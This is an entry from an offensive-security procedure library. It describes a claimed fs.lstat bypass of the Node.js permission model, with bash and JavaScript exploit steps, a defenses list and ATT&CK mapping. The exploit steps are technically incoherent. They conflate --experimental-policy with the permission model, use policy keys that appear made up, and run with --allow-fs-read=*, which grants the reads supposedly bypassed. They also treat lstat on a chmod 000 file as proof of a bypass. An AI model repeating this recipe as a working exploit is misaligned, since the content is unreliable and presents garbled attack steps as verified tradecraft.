---
id: proc-nodejs-fs-lstat-bypass
tags:
  - nodejs
  - permission-bypass
  - information-disclosure
  - file-discovery
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
commands:
  - '[[commands/create-policy-file]]'
  - '[[commands/node-fs-lstat-bypass]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-09-12T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:28.401Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Bypass Node.js Permission Model with fs.lstat

## Summary

This procedure exploits a vulnerability in Node.js's experimental permission model (versions 20 and 22) where the fs.lstat API bypasses read restrictions, allowing retrieval of file metadata (such as size, permissions, and timestamps) from files without explicit read access, even when --allow-fs-read is specified. It enables information disclosure in environments relying on this model for sandboxing.

## Description

Node.js's experimental permission model, enabled via --experimental-policy, allows fine-grained control over filesystem operations. However, when --allow-fs-read is used to permit reads, the fs.lstat function does not enforce permissions on stat operations, leading to unauthorized metadata access. This was reported on HackerOne (Report #2145862) by researcher haxatron1 on September 12, 2023. The attack targets local Node.js runtimes in development or controlled environments, potentially leaking sensitive file details to escalate privileges or gather reconnaissance.

## Requirements

1. Node.js version 20 or 22 installed
2. Local filesystem access to create policy files and scripts
3. Target files with restricted read permissions (e.g., chmod 000 on a file)
4. No network access required; runs in local runtime

## Defense

Defensive measures and detection strategies:

- Avoid using the experimental permission model in production; opt for established sandboxing like --experimental-vm-modules or external tools
- Monitor Node.js invocations for --allow-fs-read and --experimental-policy flags via process auditing
- Implement filesystem monitoring (e.g., auditd on Linux) to detect unexpected lstat calls on restricted files
- Update to patched Node.js versions if available, or disable fs.lstat in custom policy enforcement

## Objectives

1. Demonstrate bypass of permission model to access file stats without read permission
2. Disclose file metadata for reconnaissance or further exploitation
3. Highlight risks in experimental features for secure coding practices

## Instructions

### Step 1: Create Permission Policy File

**Context**: Define a policy that disallows general operations but allows fs-read, setting up the vulnerable configuration.

**Command** ([[commands/create-policy-file]]):
```bash
cat > policy.json << EOF
{
  "experimental-policy": {
    "default": "disallow",
    "allow-fs-read": ["*"]
  }
}
EOF
```

> This creates a policy.json file that enables the permission model with fs-read allowed, but the vuln allows lstat bypass.

### Step 2: Create and Execute Exploit Script

**Context**: Write a Node.js script using fs.lstat to target a restricted file, then run it under the policy to bypass restrictions and retrieve stats.

**Command** ([[commands/node-fs-lstat-bypass]]):
```bash
cat > exploit.js << EOF
import fs from 'fs/promises';

async function statFile(path) {
  try {
    const stats = await fs.lstat(path);
    console.log('File stats retrieved:', {
      size: stats.size,
      mode: stats.mode,
      mtime: stats.mtime,
      isDirectory: stats.isDirectory()
    });
  } catch (err) {
    console.error('Error:', err.message);
  }
}

// Target a file without read permission, e.g., /tmp/restricted.txt (chmod 000)
statFile('/tmp/restricted.txt');
EOF

node --experimental-policy=policy.json --allow-fs-read=* exploit.js
```

> The script imports fs/promises and calls lstat on a restricted file path. Expected output includes file stats like size and timestamps, confirming the bypass. If successful, no permission error occurs despite restrictions.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]
- [[Discovery]]

### Techniques

- [[JavaScript]]
- [[File and Directory Discovery]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/create-policy-file]]
- [[commands/node-fs-lstat-bypass]]

## Tools Used


## Tags

- nodejs
- permission-bypass
- information-disclosure
- file-discovery
